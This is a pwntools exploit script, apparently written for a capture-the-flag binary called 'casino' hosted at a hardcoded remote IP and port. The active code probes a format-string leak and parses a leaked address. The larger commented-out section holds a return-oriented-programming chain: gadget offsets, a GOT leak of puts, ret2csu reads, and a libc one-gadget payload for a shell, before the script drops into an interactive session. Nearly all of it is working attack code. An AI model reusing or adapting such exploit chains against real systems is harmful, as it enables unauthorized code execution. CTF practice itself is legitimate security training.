from pwn import * 
# from libcfind import *

local_mote=1
elf='./casino'
e=ELF(elf)
# context.log_level = 'debug'
context.arch=e.arch
ip_port=['159.65.90.3', 30153]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])


p.sendline('1')


p.sendline('1')
p.sendline('%p')
for i in range(10):
    p.sendline('1')
    p.recvuntil('Pick a number (0-32)')
    p.sendline('\x00')
    p.recv()
# debug()
p.sendline('3')

p.recvuntil('Pick a number (0-32)')

p.sendline('\x00')

p.recvuntil('[-]')

addr=int(p.recvuntil('is')[:-2])
log.info(hex(addr))
# e_base=addr-0xb20
#0x00000000000018f3 : pop rdi ; ret
#0x000000000000226b : call qword ptr [rbp + 1]
#0x0000000000000b80 : pop rbp ; ret
#0x00000000000009e6 : ret
# ret=e_base+0x00000000000009e6 
# call_rbp=e_base+0x000000000000226b
# rdi_ret=e_base+0x00000000000018f3
# rbp_ret=e_base+0x0000000000000b80
# e_put=e_base+e.plt['puts']
# e_got_put=e_base+e.got['puts']
# log.info('puts:'+hex(e_put)+'-'+hex(e_got_put))

# e_got_read=e_base+e.got['read']
# e_alarm=e_base+e.plt['alarm']
# #p.sendline('\x01'*0x840)
# base_addr=0x204700+e_base
# #0x00000000000009e6 : ret
# #0x000000000000EF2  ; void *last_chance(void *)
# """
# pay='\x7f'*0x38+p64(rdi_ret)+p64(e_got_put)+p64(e_put)+p64(rdi_ret)+p64(0x200)+p64(e_alarm)+csu(e_got_read,0,base_addr-1,0x10,rdi_ret)+p64(base_addr+8)
# pay+=csu(e_got_read,0,base_addr,0x18,rdi_ret)+p64(base_addr+0x10)+csu(e_got_read,0,0,0,rdi_ret)+p64(base_addr+0x10)+p64(rbp_ret)+p64(base_addr-1)+p64(0x00000000000009e6+e_base)+p64(call_rbp)+'x'*8
# pay+=(0x900-len(pay))*'\x7f'
# """
# pay='\x7f'*0x38+p64(rdi_ret)+p64(e_got_put)+p64(e_put)+p64(e_base+0x000000000000EF2)*2
# pay+=(0x8ff-len(pay))*'\x7f'
# #debug()
# p.sendline(pay)

# puts_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
# x=finder('puts',puts_base)

# pay='\x00'*0x38+p64(x.ogg())+p64(e_base+0x000000000000EF2 )
# pay+=(0x8ff-len(pay))*'\x00'
# p.sendline(pay)
p.interactive()